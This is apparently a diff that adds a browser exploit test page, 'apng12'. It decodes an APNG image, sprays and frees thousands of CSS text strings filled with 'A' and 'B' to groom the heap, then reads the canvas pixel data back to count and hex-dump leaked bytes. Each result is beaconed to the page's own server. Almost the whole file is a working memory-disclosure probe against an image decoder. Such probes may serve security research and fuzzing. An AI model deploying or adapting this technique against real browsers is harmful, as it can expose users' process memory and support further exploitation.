@@ -1,0 +1,40 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng12</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url; }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function drawN(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
+var seq=0;
+function load(im){ return img('/corpus/'+im+'?n='+(++seq)); }
+function cnt(d,n,val){ var c=0; for(var i=0;i<n*4;i++) if(d[i]===val) c++; return c; }
+function rep(tag,d,n){ b(tag+'-c41-'+cnt(d,n,0x41)+'-c42-'+cnt(d,n,0x42)+'-hex-'+hexAll(d.slice(0,24*4),24)); }
+function cssSpray(n,len,ch){
+  var host=document.createElement('div'); document.body.appendChild(host);
+  var nodes=[]; var s=''; for(var i=0;i<len;i++) s+=ch;
+  for(var i=0;i<n;i++){ var d=document.createElement('div'); d.textContent=s+i%10; host.appendChild(d); nodes.push(d); }
+  // force layout so strings are really instantiated
+  var h=host.offsetHeight;
+  // drop: last reference to each StringImpl goes away synchronously
+  for(var i=0;i<n;i++){ nodes[i].textContent=''; }
+  host.removeChild(host.firstChild);
+  b('A12-spray-'+n+'-'+len+'-'+h);
+  return host;
+}
+function boot(){
+  b('A12-BOOT');
+  load('apng-fw1.png').then(function(a){
+    var d0=drawN(64,a); rep('A12-A0',d0,64);
+    var host=cssSpray(6000,240,'A');
+    load('apng-fw1.png').then(function(f){
+      var d1=drawN(64,f); rep('A12-A1',d1,64);
+      document.body.removeChild(host);
+      var host2=cssSpray(6000,240,'B');
+      load('apng-fw1.png').then(function(g){
+        var d2=drawN(64,g); rep('A12-B1',d2,64);
+        document.body.removeChild(host2);
+        b('A12-DONE');
+      });
+    });
+  });
+}
+boot();
+</script></head><body><p>apng12</p></body></html>
